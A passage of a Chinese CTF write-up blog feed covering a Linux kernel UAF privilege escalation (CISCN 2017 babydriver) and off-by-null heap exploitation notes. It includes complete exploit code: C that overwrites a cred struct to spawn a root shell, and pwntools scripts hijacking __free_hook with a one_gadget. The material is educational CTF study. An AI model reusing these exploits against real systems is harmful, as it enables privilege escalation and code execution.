<code>uid</code> <code>euid</code>等字段为 <code>0</code>，也就是能控制 <code>cred</code> 结构体的话，那么攻击者就获得了 <code>root</code> 权限，如果再开启一个 <code>shell</code> 的话，执行的任何命令也都是拥有 <code>root</code> 权限</p><h5 id="题目链接">题目链接</h5><p><a href="https://github.com/cc-sir/ctf-challenge/blob/master/2017CISCN%20babydriver/babydriver.tar">https://github.com/cc-sir/ctf-challenge/blob/master/2017CISCN babydriver/babydriver.tar</a></p><p>解压文件</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tar -xvf babydriver.tar</span><br></pre></td></tr></table></figure><p><code>boot.sh</code> 文件</p><p>因为我的虚拟机不支持 <code>kvm</code> ，所以把原本 <code>-enable-kvm</code> 这段代码删了，为了方便之后使用 <code>gdb</code> 进行调试，加上了 <code>-gdb tcp::1234</code> 这段代码</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append <span class="string">&#x27;console=ttyS0 root=/dev/ram oops=panic panic=1&#x27;</span>  -monitor /dev/null -m 64M --nographic  -smp cores=1,threads=1 -cpu kvm64,+smep -gdb tcp::1234</span><br></pre></td></tr></table></figure><p>然后运行 <code>boot.sh</code> 启动即可。</p><h5 id="逆向分析">逆向分析</h5><h6 id="babyopen">babyopen</h6><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303261513281.png" alt="image-20230326151320208"></p><p>申请了 <code>0x40</code> 的堆空间，并返回申请的内存首地址记录在 <code>babydevice_t</code> 结构体的 <code>device_buf</code> 字段</p><p>将 <code>0x40</code> 赋值为 <code>babydevice_t</code> 结构体的 <code>device_buf</code> 字段。需要注意的是 <code>babydevice_t</code> 结构体位于 <code>bss</code> 段上，这个全局变量就会存在被覆盖的可能，也就是说我连续 <code>open</code> 两次，那么第二次申请出来的内存块地址则会覆盖第一次申请的内存块地址。</p><h6 id="babyioctl">babyioctl</h6><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303262003083.png" alt="image-20230326200309961" style="zoom: 80%;" /><p>该函数定义了一个 <code>0x10001</code> 的命令，先将 <code>babydevice_t</code> 结构体中的 <code>device_buf</code> 给释放掉，然后重新申请了一块内存，因为 <code>v3</code> 是 <code>rdx</code> 寄存器所赋值的，也就是 <code>babyioctl</code> 函数的第三个参数，而 <code>v3</code> 又给了 <code>v4</code> ，这个内存大小是我们可控的。</p><h6 id="babyread">babyread</h6><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303262016891.png" alt="image-20230326201609836"></p><p>该函数显示检查了 <code>device_buf</code> 是否为空，如果为空的话返回 <code>-1</code> ，如果 <code>device_buf_len</code> 大于 <code>write</code> 函数的第三个参数则将 <code>device_buf</code> 中的数据 <code>copy</code> 到用户区 <code>buffer</code> 空间中</p><p>这里 <code>ida</code> 生成的伪代码是有点问题的，正常情况是 <code>copy_to_user(buffer, babydev_struct.device_buf, v4);</code></p><h6 id="babywrite">babywrite</h6><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303262041836.png" alt="image-20230326204108774"></p><p>这个函数和 <code>babywrite</code> 是相反的，将数据从用户区的 <code>buffer</code> 复制到内核中的 <code>device_buf</code> 。</p><h6 id="babyrelease">babyrelease</h6><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303262101441.png" alt="image-20230326210113392" style="zoom: 80%;" /><p>该函数可以将 <code>device_buf</code> 这个堆块给释放掉，但是释放内存后，未将指针置空，产生了 <code>UAF</code> 漏洞。</p><h4 id="利用思路">利用思路</h4><p>连续 <code>open</code> 两次，分配出 <code>fd1</code> 和 <code>fd2</code> ，此时 <code>fd2</code> 将 <code>fd1</code> 的堆块地址覆盖掉了。再使用 <code>ioctl</code> 函数去执行那个 <code>0x10001</code> 的指令，将 <code>fd1</code> 释放掉 （其实释放的是 <code>fd2</code> ），再申请一个 <code>0xa8</code> 的堆块出来（用于伪造 <code>cred</code> 结构体 ），接着再用 <code>release</code> （也就是 <code>close</code> ） 函数将 <code>fd1</code> 释放掉（此时释放的是刚刚申请出来 <code>0xa8 </code>的那个堆块）</p><p>调用 <code>fork</code> 函数，创建一个子进程出来，并让父进程 <code>wait</code>。子进程产生时，就需要申请一个 <code>0xa8</code> 的堆块用来当做 <code>cred</code> 结构体，这时就会申请出来刚刚的我们释放掉的堆块。因为最后 <code>release</code> 是对 <code>fd1</code> 操作的，此时 <code>fd2</code> 是依然可以被写入数据的，向 <code>fd2</code> 中写入数据就等同于向子进程刚刚申请 <code>cred</code> 结构体中写入数据。此时父进程中 <code>device_buf</code> 记录的就是刚刚子进程申请堆块的地址。</p><p>将其 <code>cred</code> 结构体前 <code>0x28</code> 个字节覆盖成 <code>\x00</code> 执行 <code>system(&quot;/bin/sh&quot;)</code> 即可开启一个 <code>root</code> 权限下的 <code>shell</code> ，也就完成了所谓的内核提权。</p><p>上述思路的重点在于，<code>release</code> 操作对一个文件使用后，就无法再用 <code>write</code> 等函数进行该文件的操作了。但 <code>fd1</code> 和 <code>fd2</code> 其实都同时指向了<code>device_buf</code> （无论 <code>device_buf</code> 是哪个堆块地址）。因此用 <code>release</code> 函数释放 <code>fd1</code> 将申请的 <code>0xa8</code> 堆块给 <code>free</code> 掉，通过 <code>write</code> 函数对 <code>fd2</code> 操作依然可以写入数据。</p><h4 id="EXP">EXP</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> fd1=open(<span class="string">&quot;/dev/babydev&quot;</span>,O_RDWR);</span><br><span class="line"><span class="type">int</span> fd2=open(<span class="string">&quot;/dev/babydev&quot;</span>,O_RDWR);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;fd1 ---&gt; %d\n&quot;</span>,fd1);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;fd2 ---&gt; %d\n&quot;</span>,fd2);</span><br><span class="line">ioctl(fd1,<span class="number">0x10001</span>,<span class="number">0xa8</span>);</span><br><span class="line">close(fd1);</span><br><span class="line"><span class="type">int</span> id;</span><br><span class="line"><span class="type">char</span> cred[<span class="number">0xa8</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">id=fork();</span><br><span class="line"><span class="keyword">if</span>(id&lt;<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;fork error!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(id&gt;<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">wait(<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(id==<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">write(fd2,cred,<span class="number">0x28</span>);</span><br><span class="line"><span class="keyword">if</span>(getuid()==<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;root user!\n&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;emmmm!\n&quot;</span>);</span><br><span class="line">close(fd2);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303262347791.png" alt="image-20230326234748211"></p><h3 id="参考文章">参考文章</h3><p><a href="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/uaf/">kernel UAF - CTF Wiki (ctf-wiki.org)</a></p><p><a href="https://blog.csdn.net/qq_40827990/article/details/97272034?spm=1001.2014.3001.5502">(47条消息) kernel pwn – UAF_钞sir的博客-CSDN博客</a></p>]]></content>
      
      
      <categories>
          
          <category> 学习总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kernel </tag>
            
            <tag> kernel-UAF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于off by null的学习总结</title>
      <link href="/posts/6c267f9e.html"/>
      <url>/posts/6c267f9e.html</url>
      
        <content type="html"><![CDATA[<p>这篇文章是我对off by null的一个学习总结，我这里就不再单独对off by one进行总结了，因为利用的思想是一样的。我对off by null的总结分为了两部分，第一部分是对利用的思路进行了总结，第二部分是对off by null做过的题目进行了总结。这篇文章不是特别适合对off by null完全不懂的师傅学习，我写的主要是总结，最后是对off by null已经有了一定理解再来看，应该会效果更好吧。</p><h1>off by null的利用思路：</h1><p>off by null漏洞，顾名思义就是溢出了一个空字节，核心是让其堆块的prev inuse位溢出为0，从而认为它的低地址堆块处于了free状态，然后加以利用。</p><p>首先我们要用到四个chunk（我们只利用三个chunk，高地址的那个chunk是防止和top chunk合并的）</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">chunk <span class="number">0</span><span class="comment">#merged chunk     （不能让这个堆块在fastbin或是tcachebin中）</span></span><br><span class="line">chunk <span class="number">1</span><span class="comment">#overflow chunk&amp;&amp;spy chunk</span></span><br><span class="line">chunk <span class="number">2</span><span class="comment">#merge chunk      （不能让这个堆块在fastbin或是tcachebin中）</span></span><br><span class="line">chunk <span class="number">3</span><span class="comment">#prevent merge chunk</span></span><br></pre></td></tr></table></figure><p>这四个堆块对应的名字我也做了标注（就是上面的merged chunk   overflow chunk等等)</p><blockquote><p>1、先将这四个chunk都申请出来，注意merged chunk和merge chunk的大小，不能让他们在tcachebin或者fastbin中（不然就无法合并了），同时还要考虑overflow chunk的大小，因为要产生off by null，所以它的大小应该为八字节结尾（例如0x58,0x68,0x78···），然后释放掉merged chunk，为了保证接下来的合并可以顺利进行</p><p>2、接着编辑 overflow chunk，让他产生off by null漏洞溢出空字节到merge chunk的prev inuse位，同时把merge chunk的prev inuse位给改了（其大小要保证当前地址减去这个prev size正好能找到merged chunk（如果程序中没有编辑功能，那就将overflow chunk free掉，再申请回来写入数据造成溢出）。</p><p>3、然后释放掉merge chunk，此时检测到自身的prev inuse位是0，触发向前合并（先会触发向后合并，不过只要后面的那个chunk不是Top chunk就不会合并)（我个人习惯将向低地址合并称为向前合并）</p><p>4、最终由于merge chunk合并时直接找到了merged chunk，因此这二者之间的所有区域都处于了free状态，但是这二者之间其实还有一个<strong>spy_chunk（我把它叫做间谍堆块，因为它没有被free掉却处于了free的合并区域）</strong></p><p>剩下的就具体题目具体分析吧，反正接下来的利用就是要配合spy_chunk的特性（它的特性就是它出在free的区域，但是自己是没有被free掉的，然后就可以打double free、堆块重叠等等）</p></blockquote><blockquote><p>为什么要利用off by null让chunk的prev inuse位成0？</p><p>因为当前chunk的prev inuse位决定了上个堆块是否处于free状态，这也就决定着是否能够向前合并（我个人习惯将向低地址合并称为向前合并）。我们确实释放了上个堆块，但是改变的是spy_chunk的prev inuse位，不过我们现在想忽略这个spy_chunk，因此要将当前chunk的prev_size位伪造成0，来保证之后的向前合并可以正常进行。</p></blockquote><h1>相关题目wp</h1><h2 id="hitcon-2018-children-tcache">hitcon_2018_children_tcache</h2><h3 id="保护策略：">保护策略：</h3><p><img src="../img/image-20221007204338075.png" alt="image-20221007204338075"></p><h3 id="漏洞分析：">漏洞分析：</h3><blockquote><p>strcpy函数会被00所截断，然后将字符串的末尾加上00</p></blockquote><p><img src="../img/yMsXAuZb7VFi9Rx-1665146431266-38.png" alt="image-20220609225655542"></p><p>因此我们输入的大小本身不会造成溢出，但是strcpy函数最后补充的00造成了off by null。</p><p><img src="../img/image-20221007204401427.png" alt="image-20221007204401427"></p><p>这道题bss段上存放的堆索引是0-9 从最小判断，哪个空的用哪个。</p><h3 id="利用思路：">利用思路：</h3><p>先申请四个堆块</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">chunk <span class="number">0</span><span class="comment">#size &gt;0x410</span></span><br><span class="line">chunk <span class="number">1</span><span class="comment">#overflow chunk&amp;&amp;spy chunk</span></span><br><span class="line">chunk <span class="number">2</span><span class="comment">#lead chunk size&gt;0x410</span></span><br><span class="line">chunk <span class="number">3</span><span class="comment">#prevent merge chunk</span></span><br></pre></td></tr></table></figure><p>然后将0,1chunk释放掉，再将1申请回来（释放0是为了接下来的合并，再把1给申请回来是因为要重新写入数据，来产生off_by_null，因为<strong>没有edit功能所以不得不这样</strong>）</p><p>用循环来清空一下chunk2 的prev size位（方便接下来布置数据，不然里面装的是垃圾数据），然后写入prev size位，它的大小应该能保证释放掉chunk2后，和chunk0合并（也就是chunk0加上chunk1+0x10大小）</p><p>然后释放掉chunk2，使chunk0和chunk2合并（处于tcachebin中的chunk是无法合并的）<strong>（chunk1本来是allocated状态，但是属于chunk0和chunk2合并的区域，因此它表面上看起来是free掉了，但实际上它是allcoated，如果有edit功能的话，就可以往一块被free掉的区域来写入数据了（因此我也管它叫做spy chunk 间谍堆块）</strong></p><p>但是这道题并没有edit功能。不过我们可以将chunk0申请回来，然后show 1来泄露libc地址。</p><p>因为unsortbin里面如果只有一个chunk，那么它的fd和bk指针都是指向了main_arena（它位于libc中），所以我们将chunk0申请回来的话，那么现在unsortedbin中的chunk则位于了chunk1的位置，chunk1可是没有被释放掉的（这意味着它里面的内容是可以被打印出来的）。如此chunk1中的fd和bk的位置就成了libc里的地址，然后show就将libc地址打印出来了。（此时的情况如下图）</p><p><img src="../img/image-20221007204430252.png" alt="image-20221007204430252"></p><p>现在的情况是chunk1没有被释放（至少我们没有主动释放chunk1，并且bss段上依旧记录着chunk1的地址信息），但是由于之前的chunk0和chunk2将这片区域合并了，再将chunk0申请回来的话，bins中存放的就是chunk1的地址了。因此我们现在的chunk1处于了释放又没被释放的叠加态,hhh。</p><p>我们再申请一个chunk1大小的堆块，这样就会从当前的unsortedbin中拿，可是别忘了我们的unsortedbin中的地址就是chunk1的地址，因此bss段上就记录了两次chunk1的地址（这意味着我们可以释放同一个地址两次，尽管这道题free指针后置空了，但依旧造成了double free)</p><p>我们将bss段上是chunk1地址的两个堆块全部释放掉，造成double free。（效果如下）</p><p><img src="../img/image-20221007204439685.png" alt="image-20221007204439685"></p><p>我们申请回来一个chunk,将里面的数据写成__free_hook（这个里面的数据指的就是原本fd指针的位置）</p><p>结果发现申请了一个chunk之后，tcachebins里面的那条链上还是有俩chunk（如下图）</p><p><img src="../img/image-20221007204452069.png" alt="image-20221007204452069"></p><blockquote><p>经过<a href="https://roderickchan.github.io/">roderick</a>师傅的提示，发现是因为它自身是形成了一个环，自己指向着自己，如果不修改它的fd指针的话，即使申请一个chunk出来，然后去顺着chunk的fd找上一个chunk的时候发现还是它自己，因此这个循环永远也不会结束（如果不改变fd的话），也就是可以无限申请这个地址的堆块。如果想打破循环也就是要修改它的fd指针，此处我申请它的fd指针为__free_hook地址来打破这个循环。</p><p>至于为啥上面申请完后，还有俩chunk是因为先申请的chunk，再修改的fd，所以依然有两个（不过循环已经结束了）</p></blockquote><p>然后将地址在__free_hook上的chunk申请出来，写入one_gadget地址，执行free即可获取shell。</p><h3 id="EXP：">EXP：</h3><p><a href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">tools源码</a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc=load(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29644</span>)</span><br><span class="line"><span class="comment">#debug(p,&#x27;pie&#x27;,0x1029)</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Size:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Data:&#x27;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">new(<span class="number">0x4f0</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#merged chunk</span></span><br><span class="line">new(<span class="number">0x48</span>,<span class="string">&#x27;bbbb&#x27;</span>)<span class="comment">#spy chunk</span></span><br><span class="line">new(<span class="number">0x4f0</span>,<span class="string">&#x27;cccc&#x27;</span>)<span class="comment">#merge chunk</span></span><br><span class="line">new(<span class="number">0x10</span>,<span class="string">&#x27;dddd&#x27;</span>)<span class="comment">#prevent chunk</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">new(<span class="number">0x48</span>,<span class="string">&#x27;e&#x27;</span>*<span class="number">0x48</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    new((<span class="number">0x47</span>-i),<span class="string">&#x27;f&#x27;</span>*(<span class="number">0x47</span>-i))</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line">new(<span class="number">0x48</span>,<span class="string">b&#x27;g&#x27;</span>*<span class="number">0x40</span>+p64(<span class="number">0x550</span>))</span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">delete(<span class="number">2</span>)<span class="comment">#touch off merge</span></span><br><span class="line"></span><br><span class="line">new(<span class="number">0x4f0</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">leak_libc_addr=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log_addr(<span class="string">&#x27;leak_libc_addr&#x27;</span>)</span><br><span class="line">libc_base_addr=leak_libc_addr-<span class="number">0x3ebca0</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base_addr&#x27;</span>)</span><br><span class="line">free_hook_addr=libc_base_addr+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">log_addr(<span class="string">&#x27;free_hook_addr&#x27;</span>)</span><br><span class="line">one_gadget=[<span class="number">0x4f2a5</span>,<span class="number">0x4f302</span>,<span class="number">0x10a2fc</span>]</span><br><span class="line">one_gadget=libc_base_addr+one_gadget[<span class="number">1</span>]</span><br><span class="line">new(<span class="number">0x50</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">new(<span class="number">0x50</span>,p64(free_hook_addr))</span><br><span class="line">new(<span class="number">0x50</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">new(<span class="number">0x50</span>,p64(one_gadget))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="../img/image-20221007204507054.png" alt="image-20221007204507054"></p><h2 id="asis2016-b00ks">asis2016_b00ks</h2><h3 id="总结：">总结：</h3><p>通过学习这道题的总结与收获有：</p><p>1、这道题存在off_by_null漏洞，可以利用该漏洞让结构体堆块落在我们可控的区域内，从而可以对结构体堆块中存放的chunk地址进行修改。</p><p>2、利用mmap申请超大内存，然后配合off_by_null修改结构体堆块中的chunk地址，执行show函数进行泄露libc基地址，同理用edit函数来劫持__free_hook，写入one_gadget。</p><h3 id="保护策略：-v2">保护策略：</h3><p><img src="../img/image-20221007204614828.png" alt="image-20221007204614828"></p><h3 id="漏洞分析：-v2">漏洞分析：</h3><p><img src="../img/image-20221007204636156.png" alt="image-20221007204636156"></p><p>在这个函数里（已被重命名）存在off_by_null漏洞，我们输入最大字节的数据时，会多出来一个0造成了溢出。分析一下几个关键的点，然后判断一下这里能否被利用。</p><p>首先是程序里存在一个结构体，如下。该结构体大小为0x20字节，以最大的成员字节数作为结构体每个变量类型的基本长度，最大为8字节，因此四个变量全部八字节对齐，结构体为0x20字节。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">info</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span> id;</span><br><span class="line">    <span class="type">void</span> *book_name;</span><br><span class="line">    <span class="type">void</span> *description;</span><br><span class="line">    <span class="type">int</span> description_size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个结构体记录了两个chunk的位置（也就是两个void指针），和结构体的id以及description_chunk的大小。然后结构体的地址存储到了bss段，而结构体是单独存放在了一个chunk。<strong>（意味着一次create就会产生三个chunk，分别是存放book_name的chunk和description的chunk和结构体chunk）</strong></p><p>结构体的地址存储在下图的位置。</p><p><img src="../img/image-20221007204647488.png" alt="image-20221007204647488"></p><p>同时这道题有个比较重要的变量就是author name。因为它存在off_by_null漏洞，下图是author_name的位置。<img src="../img/9F5lswCuGDYvaMR-1665146431267-47.png" alt="image-20220603174907077"></p><p>距离存在结构体的地址仅仅只有0x20个字节。而我们可以往author_name里面写入0x20字节的数据，这就导致了我们是可以溢出到结构体地址一个00字节。具体情况先写个脚本跑一下。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc=load(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,28301)</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0x12AF</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">book_name_size,book_name,book_description_size,book_description</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter book name size: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(book_name_size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter book name (Max 32 chars): &#x27;</span>)</span><br><span class="line">    p.sendline(book_name)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter book description size: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(book_description_size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter book description: &#x27;</span>)</span><br><span class="line">    p.sendline(book_description)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter the book id you want to delete: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params"><span class="built_in">id</span>,book_description</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter the book id you want to edit: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter new book description: &#x27;</span>)</span><br><span class="line">    p.sendline(book_description)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_name</span>(<span class="params">content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter author name: &#x27;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Enter author name: &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">create(<span class="number">0x20</span>,<span class="string">&#x27;aaaa&#x27;</span>,<span class="number">0x30</span>,<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">change_name(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>下图就是此时利用off_by_null漏洞前的情况，此时结构体地址里是正常存放的四个成员变量。</p><p><img src="../img/image-20221007204711563.png" alt="image-20221007204711563"></p><p>可以看见下图，存放的结构体地址的最低字节已经被修改成了00。</p><p><img src="../img/image-20221007204719564.png" alt="image-20221007204719564"></p><h3 id="利用思路：-v2">利用思路：</h3><h4 id="平常使用show或者edit、free函数是怎么找到对应的chunk的？">平常使用show或者edit、free函数是怎么找到对应的chunk的？</h4><p><strong>先去bss段找存放的对应结构体地址，然后去看结构体里面记录的chunk信息，再通过chunk信息（也就是chunk的地址）来找到对应的chunk</strong>。<u>现在我们已经把结构体地址给改了，如果我们能够往这个结构体地址里面写入数据，就相当于我们可以去非法进行edit、show、free了（因为可以去操作原本不存在的chunk）</u>。接下来的核心就是我们要确定是否能够往这个结构体里写入数据。</p><p>可以看到上图这个地址是0x000055937ccbe000。我们看一下当前两个chunk的地址。</p><p><img src="../img/image-20221007204732988.png" alt="image-20221007204732988"></p><p>根据上图可以发现，我们现在并不能控制0x000055937ccbe000这个地址，但是我们可以控制第一个和第二个堆块（我们申请的chunk）的大小，<strong>我们只需要构造一下前两个堆块的大小，让0x000055937ccbe000这个地址落在description的这个chunk即可（因为我们edit可以编辑description这个chunk）</strong> 稍微算一下，只需要让第一个chunk大小为0xd0（调试或者自己用计算器减，都能算出来），那么就可以让0x000055937ccbe100(这里变成0x000055937ccbe100的原因是前两个堆块太的抬高，让第二字节的后半个字节进位了，但并不影响，因为覆盖的仅仅是最后一个字节成00）这个地址落在description这个chunk的范围里，这步的目的是为了接下来编辑结构体内容打下铺垫。（可以发现下图的description_chunk是从已经覆盖到了0x000055937ccbe100)</p><p><img src="../img/image-20221007204742463.png" alt="image-20221007204742463"></p><p>接下来，我们只需用edit编辑这个chunk，然后构造一个struct_chunk即可。</p><p>将其中的description_chunk的地址改成free的got表，然后用show泄露它的真实地址，再用edit去修改它的真实地址？</p><p>我们先使用下面的脚本试试这件事情。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc=load(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,28301)</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0x12af</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">book_name_size,book_name,book_description_size,book_description</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter book name size: &#x27;</span>)</span><br><span 